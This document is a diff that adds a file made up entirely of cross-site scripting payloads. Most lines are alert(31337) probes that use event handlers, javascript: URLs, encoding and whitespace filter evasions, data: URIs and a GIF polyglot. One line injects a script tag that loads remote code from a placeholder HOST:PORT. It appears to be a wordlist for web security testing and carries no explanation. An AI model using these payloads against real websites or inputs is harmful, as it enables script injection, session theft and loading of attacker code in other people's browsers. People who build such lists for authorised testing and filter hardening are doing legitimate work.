@@ -1,0 +1,114 @@
+"><svg/onload=alert(31337)>
+<svg onload=alert(31337)>
+`'"><svg/onload=alert(31337)>
+`'"onmouseenter=alert(31337)//
+`'"><img src=x onerror=alert(31337)>
+<script>alert(31337)</script>
+"><svg onload=alert(31337)>
+"onmouseover=alert(31337)//
+"autofocus/onfocus=alert(31337)//
+'-alert(31337)-'
+'-alert(31337)//
+\'-alert(31337)//
+</script><svg onload=alert(31337)>
+<x contenteditable onblur=alert(31337)>lose focus!
+<x onclick=alert(31337)>click this!
+<x oncopy=alert(31337)>copy this!
+<x oncontextmenu=alert(31337)>right click this!
+<x oncut=alert(31337)>copy this!
+<x ondblclick=alert(31337)>double click this!
+<x ondrag=alert(31337)>drag this!
+<x contenteditable onfocus=alert(31337)>focus this!
+<x contenteditable oninput=alert(31337)>input here!
+<x contenteditable onkeydown=alert(31337)>press any key!
+<x contenteditable onkeypress=alert(31337)>press any key!
+<x contenteditable onkeyup=alert(31337)>press any key!
+<x onmousedown=alert(31337)>click this!
+<x onmousemove=alert(31337)>hover this!
+<x onmouseout=alert(31337)>hover this!
+<x onmouseover=alert(31337)>hover this!
+<x onmouseup=alert(31337)>click this!
+<x contenteditable onpaste=alert(31337)>paste here!
+<script>alert(31337)//
+<script>alert(31337)<!–
+%3Cx onxxx=alert(31337)
+<%78 onxxx=31337
+<x %6Fnxxx=31337
+<x o%6Exxx=31337
+<x on%78xx=31337
+<x onxxx%3D31337
+<X onxxx=31337
+<x OnXxx=31337
+<X OnXxx=31337
+<x onxxx=31337 onxxx=31337
+<x/onxxx=31337
+<x%09onxxx=31337
+<x%0Aonxxx=31337
+<x%0Conxxx=31337
+<x%0Donxxx=31337
+<x%2Fonxxx=31337
+<x 1='1'onxxx=31337
+<x 1="1"onxxx=31337
+<x </onxxx=31337
+<x 1=">" onxxx=31337
+<http://onxxx%3D31337/
+<x onxxx=alert(31337) 1='
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+'onload=alert(31337)><svg/1='
+'>alert(31337)</script><script/1='
+*/alert(31337)</script><script>/*
+*/alert(31337)">'onload="/*<svg/1='
+`-alert(31337)">'onload="`<svg/1='
+*/</script>'>alert(31337)/*<script/1='
+<script>alert(31337)</script>
+<script src=javascript:alert(31337)>
+<iframe src=javascript:alert(31337)>
+<embed src=javascript:alert(31337)>
+<a href=javascript:alert(31337)>click
+<math><brute href=javascript:alert(31337)>click
+<form action=javascript:alert(31337)><input type=submit>
+<isindex action=javascript:alert(31337) type=submit value=click>
+<form><button formaction=javascript:alert(31337)>click
+<form><input formaction=javascript:alert(31337) type=submit value=click>
+<form><input formaction=javascript:alert(31337) type=image value=click>
+<form><input formaction=javascript:alert(31337) type=image src=SOURCE>
+<isindex formaction=javascript:alert(31337) type=submit value=click>
+<object data=javascript:alert(31337)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;31337)&gt;>
+<svg><script xlink:href=data:,alert(31337) />
+<math><brute xlink:href=javascript:alert(31337)>click
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(31337) to=&>
+<html ontouchstart=alert(31337)>
+<html ontouchend=alert(31337)>
+<html ontouchmove=alert(31337)>
+<html ontouchcancel=alert(31337)>
+<body onorientationchange=alert(31337)>
+"><img src=31337 onerror=alert(31337)>.gif
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(31337)"/>
+GIF89a/*<svg/onload=alert(31337)>*/=alert(31337)//;
+<script src="data:&comma;alert(31337)//
+"><script src=data:&comma;alert(31337)//
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(31337)&lt;&sol;script&gt;
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(31337)&lt;&sol;script&gt;
+<base href=//0>
+<script/src="data:&comma;eval(atob(location.hash.slice(31337)))//#alert(31337)
+<body onload=alert(31337)>
+<body onpageshow=alert(31337)>
+<body onfocus=alert(31337)>
+<body onhashchange=alert(31337)><a href=#x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(31337) id=x>#x
+<body onscroll=alert(31337)><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(31337)>press F12!
+<body onhelp=alert(31337)>press F1! (MSIE)
+<marquee onstart=alert(31337)>
+<marquee loop=31337 width=0 onfinish=alert(31337)>
+<audio src onloadstart=alert(31337)>
+<video onloadstart=alert(31337)><source>
+<input autofocus onblur=alert(31337)>
+<keygen autofocus onfocus=alert(31337)>
+<form onsubmit=alert(31337)><input type=submit>
+<select onchange=alert(31337)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(31337)>right click me!
